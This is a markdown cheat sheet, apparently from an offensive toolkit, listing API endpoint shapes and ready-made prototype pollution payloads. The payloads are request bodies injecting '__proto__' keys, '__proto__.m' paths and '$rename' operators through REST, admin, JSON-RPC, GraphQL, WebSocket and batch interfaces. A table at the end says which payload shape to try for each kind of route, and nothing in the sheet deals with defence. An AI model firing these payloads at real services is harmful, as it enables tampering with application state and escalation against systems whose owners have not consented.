# API shapes — the endpoint grammars that carry the write

The route-level vocabulary a pollution write rides on. Each shape
names the request surface and where in it the object-carrying field
lives.

---

## 1. The REST-CRUD shapes

```
POST   /api/<resource>            create — body IS the object
PUT    /api/<resource>/<id>       replace — body merges over existing
PATCH  /api/<resource>/<id>       partial-update — body merges
POST   /api/<resource>/<id>/update  named-update — body merges
POST   /api/<resource>/<id>/edit    same
POST   /api/<resource>/<id>/patch   same
POST   /api/<resource>/<id>/set     field-set — path-API
POST   /api/<resource>/<id>/merge   explicit-merge
POST   /api/<resource>/<id>/extend  explicit-extend
POST   /api/<resource>/<id>/config  config-update — the config sink
POST   /api/<resource>/<id>/settings  settings-update
POST   /api/<resource>/<id>/prefs     preferences-update
POST   /api/<resource>/<id>/options   options-update
POST   /api/<resource>/<id>/meta      meta-update
POST   /api/<resource>/<id>/props     props-update
POST   /api/<resource>/<id>/attrs     attrs-update
POST   /api/<resource>/<id>/fields    fields-update
POST   /api/<resource>/<id>/bulk      bulk-update — an array of ops
POST   /api/<resource>/bulk           collection-bulk
POST   /api/<resource>/batch          batch-ops
POST   /api/<resource>/import         import — file/JSON merge
POST   /api/<resource>/import-json    explicit
POST   /api/<resource>/restore        restore-from-backup — JSON merge
POST   /api/<resource>/sync           sync — bidirectional merge
POST   /api/<resource>/clone          clone+overrides — merge
POST   /api/<resource>/copy           copy+overrides — merge
POST   /api/<resource>/template       apply-template — merge
POST   /api/<resource>/apply          apply a config — merge
POST   /api/<resource>/configure      configure — merge
POST   /api/<resource>/register       register — create+merge
POST   /api/<resource>/signup         signup — profile merge
POST   /api/<resource>/profile        profile-update — merge
POST   /api/<resource>/account        account-update
POST   /api/<resource>/preferences    preferences
POST   /api/<resource>/theme          theme — a config merge
POST   /api/<resource>/layout         layout — a config merge
POST   /api/<resource>/customize      customize — merge
POST   /api/<resource>/personalize    personalize — merge
```

The `PATCH`/`PUT`/`update`/`settings`/`config`/`merge`/`extend`/
`import`/`apply`/`restore`/`template`/`clone`/`customize` shapes
are the merge-sites — the body or a named field is the carrier.

## 2. The config/admin shapes — the high-value sinks

```
POST /api/config                  the config merge
POST /api/config/update
POST /api/config/set
POST /api/config/merge
POST /api/settings
POST /api/settings/update
POST /api/preferences
POST /api/options
POST /api/opts
POST /api/params
POST /api/vars
POST /api/env
POST /api/context
POST /api/state
POST /api/store
POST /api/cache/set               cache-write — the stored-pollution
POST /api/render                  render-with-opts — the template sink
POST /api/render/preview
POST /api/render/test
POST /api/template/render
POST /api/template/compile
POST /api/template/apply
POST /api/view/render
POST /api/export                  export-with-opts
POST /api/report/generate         report-opts
POST /api/pdf/generate            pdf-opts — a render sink
POST /api/mail/send               mail-template-opts
POST /api/notify                  notify-template-opts
POST /api/webhook                 webhook-config — url sink
POST /api/callback                callback-config — url sink
POST /api/notify-url
POST /api/import                  import — file/JSON merge
POST /api/upload/config           config-upload
POST /api/upload/settings
POST /api/upload/opts
POST /api/backup/restore          restore-merge
POST /api/snapshot/restore
POST /api/admin/config
POST /api/admin/settings
POST /api/admin/options
POST /api/admin/update
POST /api/admin/set
POST /api/admin/env
POST /api/admin/reload            reload-trigger — second-order
POST /api/admin/restart           restart-trigger — second-order
POST /api/internal/config
POST /api/internal/settings
POST /api/internal/set
POST /api/system/config
POST /api/system/settings
POST /api/system/env
POST /api/system/update
```

## 3. The path-API shapes — `set(path, val)`

```
POST /api/set              {"field":"a.b","value":v}
POST /api/set-field
POST /api/set-prop
POST /api/set-attr
POST /api/set-key
POST /api/set-path
POST /api/set-value
POST /api/update-field
POST /api/update-prop
POST /api/update-attr
POST /api/update-key
POST /api/update-path
POST /api/patch            {"path":"a.b","value":v}
POST /api/patch-field
POST /api/patch-prop
POST /api/write            {"key":"a.b","value":v}
POST /api/write-field
POST /api/assign           {"target":"a.b","value":v}
POST /api/bind             {"name":"a.b","value":v}
POST /api/prop             {"name":"a.b","value":v}
POST /api/attr             {"name":"a.b","value":v}
POST /api/config/set       {"path":"a.b","value":v}
POST /api/settings/set
POST /api/options/set
POST /api/opts/set
POST /api/data/set
POST /api/store/set
POST /api/state/set
POST /api/meta/set
POST /api/user/<id>/set    {"field":"a.b","value":v}
POST /api/object/<id>/set
POST /api/resource/<id>/set
GET  /api/set?field=a.b&value=v    — the GET variant
GET  /api/config/set?path=a.b&value=v
GET  /api/update?field=a.b&value=v
```

## 4. The JSON-RPC shapes

```json
{"jsonrpc":"2.0","method":"setConfig","params":{"opts":{"__proto__":{"m":1}}}}
{"jsonrpc":"2.0","method":"update","params":{"a":{"__proto__":{"m":1}}}}
{"jsonrpc":"2.0","method":"merge","params":{"__proto__":{"m":1}}}
{"jsonrpc":"2.0","method":"extend","params":{"__proto__":{"m":1}}}
{"jsonrpc":"2.0","method":"assign","params":{"__proto__":{"m":1}}}
{"jsonrpc":"2.0","method":"patch","params":{"path":"__proto__.m","value":1}}
{"jsonrpc":"2.0","method":"set","params":{"field":"__proto__.m","value":1}}
{"jsonrpc":"2.0","method":"config.set","params":{"key":"__proto__.m","value":1}}
{"jsonrpc":"2.0","method":"settings.update","params":{"__proto__":{"m":1}}}
{"jsonrpc":"2.0","method":"render","params":{"opts":{"__proto__":{"m":1}}}}
{"jsonrpc":"2.0","method":"template.render","params":{"opts":{"__proto__":{"m":1}}}}
{"jsonrpc":"2.0","method":"store.set","params":{"path":"__proto__.m","value":1}}
{"jsonrpc":"2.0","method":"db.update","params":{"doc":{"$rename":{"a":"__proto__.m"}}}}
{"method":"config","params":{"__proto__":{"m":1}}}
{"method":"update","params":[{"__proto__":{"m":1}}]}
{"action":"set","args":{"field":"__proto__.m","value":1}}
{"action":"merge","args":{"a":{"__proto__":{"m":1}}}}
{"op":"set","field":"__proto__.m","value":1}
{"op":"merge","data":{"__proto__":{"m":1}}}
{"op":"patch","path":"__proto__.m","value":1}
{"cmd":"setConfig","opts":{"__proto__":{"m":1}}}
{"cmd":"update","doc":{"$rename":{"a":"__proto__.m"}}}
{"type":"set","key":"__proto__.m","value":1}
{"type":"merge","data":{"__proto__":{"m":1}}}
{"event":"config","payload":{"__proto__":{"m":1}}}
```

## 5. The GraphQL shapes

```graphql
mutation { update(input:{__proto__:{m:1}}){ok} }
mutation { updateProfile(data:{__proto__:{m:1}}){ok} }
mutation { setSettings(opts:{__proto__:{m:1}}){ok} }
mutation { configure(config:{__proto__:{m:1}}){ok} }
mutation { mergeData(payload:{__proto__:{m:1}}){ok} }
mutation { applyTheme(theme:{__proto__:{m:1}}){ok} }
mutation { renderTemplate(opts:{__proto__:{m:1}}){ok} }
mutation { updateMeta(meta:{__proto__:{m:1}}){ok} }
mutation { setField(path:"__proto__.m",value:"1"){ok} }
mutation { setPath(path:"__proto__.m",value:"1"){ok} }
mutation { updateDoc(update:{$rename:{a:"__proto__.m"}}){ok} }
query { render(opts:{__proto__:{m:1}}) }
query { preview(opts:{__proto__:{m:1}}) }
```

GraphQL input objects are JSON — a `__proto__` key inside an input
type is a legal field name (GraphQL spec allows it as an enum/field
string when the schema doesn't validate). The resolver's merge is
the sink.

## 6. The websocket-message shapes

```js
{"type":"set","field":"__proto__.m","value":1}
{"type":"update","data":{"__proto__":{"m":1}}}
{"type":"merge","data":{"__proto__":{"m":1}}}
{"type":"config","opts":{"__proto__":{"m":1}}}
{"type":"patch","path":"__proto__.m","value":1}
{"action":"set","key":"__proto__.m","value":1}
{"action":"update","doc":{"$rename":{"a":"__proto__.m"}}}
{"op":"merge","args":[{"__proto__":{"m":1}}]}
{"cmd":"setConfig","opts":{"__proto__":{"m":1}}}
{"event":"settings","payload":{"__proto__":{"m":1}}}
{"msg":{"__proto__":{"m":1}}}
{"data":{"__proto__":{"m":1}}}
{"payload":{"__proto__":{"m":1}}}
{"body":{"__proto__":{"m":1}}}
{"args":[{"__proto__":{"m":1}}]}
```

## 7. The batch/bulk shapes — an array of ops

```json
{"ops":[{"op":"set","path":"__proto__.m","value":1}]}
{"ops":[{"op":"merge","data":{"__proto__":{"m":1}}}]}
{"ops":[{"method":"set","args":{"field":"__proto__.m","value":1}}]}
{"batch":[{"type":"set","key":"__proto__.m","value":1}]}
{"requests":[{"method":"POST","path":"/set","body":{"field":"__proto__.m"}}]}
{"commands":[{"cmd":"set","key":"__proto__.m","value":1}]}
{"updates":[{"$rename":{"a":"__proto__.m"}}]}
{"documents":[{"__proto__":{"m":1}}]}
{"items":[{"__proto__":{"m":1}}]}
{"entries":[{"__proto__":{"m":1}}]}
{"records":[{"__proto__":{"m":1}}]}
{"changes":[{"field":"__proto__.m","value":1}]}
{"mutations":[{"path":"__proto__.m","value":1}]}
{"patches":[{"op":"replace","path":"/__proto__/m","value":1}]}
{"operations":[{"type":"set","target":"__proto__.m","value":1}]}
[{"__proto__":{"m":1}}]
[{"field":"__proto__.m","value":1}]
```

The batch-op wrapper — a JSON-Patch-style `path` or a method-call
array — each element's own field-name carries the proto path.

## 8. The "the body is just the object" shape

```json
// the whole body merges — top-level __proto__ IS the carrier
{"__proto__":{"m":1},"name":"x","bio":"y"}
{"name":"x","bio":"y","__proto__":{"m":1}}
{"profile":{"name":"x"},"settings":{"__proto__":{"m":1}}}
{"user":{"name":"x"},"config":{"__proto__":{"m":1}}}
{"a":{"b":{"c":{"__proto__":{"m":1}}}}}
```

## 9. The "the field is the object" shape

```json
{"settings":{"__proto__":{"m":1}}}
{"config":{"__proto__":{"m":1}}}
{"opts":{"__proto__":{"m":1}}}
{"options":{"__proto__":{"m":1}}}
{"prefs":{"__proto__":{"m":1}}}
{"preferences":{"__proto__":{"m":1}}}
{"theme":{"__proto__":{"m":1}}}
{"layout":{"__proto__":{"m":1}}}
{"meta":{"__proto__":{"m":1}}}
{"extra":{"__proto__":{"m":1}}}
{"custom":{"__proto__":{"m":1}}}
{"data":{"__proto__":{"m":1}}}
{"payload":{"__proto__":{"m":1}}}
{"input":{"__proto__":{"m":1}}}
{"body":{"__proto__":{"m":1}}}
{"doc":{"__proto__":{"m":1}}}
{"record":{"__proto__":{"m":1}}}
{"entity":{"__proto__":{"m":1}}}
{"item":{"__proto__":{"m":1}}}
{"profile":{"__proto__":{"m":1}}}
{"account":{"__proto__":{"m":1}}}
{"session":{"__proto__":{"m":1}}}
{"context":{"__proto__":{"m":1}}}
{"state":{"__proto__":{"m":1}}}
{"store":{"__proto__":{"m":1}}}
{"vars":{"__proto__":{"m":1}}}
{"params":{"__proto__":{"m":1}}}
{"args":{"__proto__":{"m":1}}}
{"env":{"__proto__":{"m":1}}}
{"overrides":{"__proto__":{"m":1}}}
{"defaults":{"__proto__":{"m":1}}}
{"extensions":{"__proto__":{"m":1}}}
{"overrides":{"a":{"__proto__":{"m":1}}}}
```

## 10. The route-signal → which shape to try

| Route signal | The likely carrier |
|---|---|
| `PATCH/PUT` on a resource | whole-body merge |
| `/config`/`/settings`/`/options` | a named-field merge or whole-body |
| `/set`/`/patch` with `field`+`value` | path-API |
| `/update`/`/edit` | whole-body or named-field |
| `/import`/`/restore`/`/apply` | JSON-blob merge |
| `/render`/`/template`/`/preview` | the opts-object merge (template sink) |
| `/webhook`/`/callback`/`/notify` | the url-config merge |
| `/bulk`/`/batch` | op-array |
| JSON-RPC | method-params |
| GraphQL | input-object |
| WebSocket | message-data |
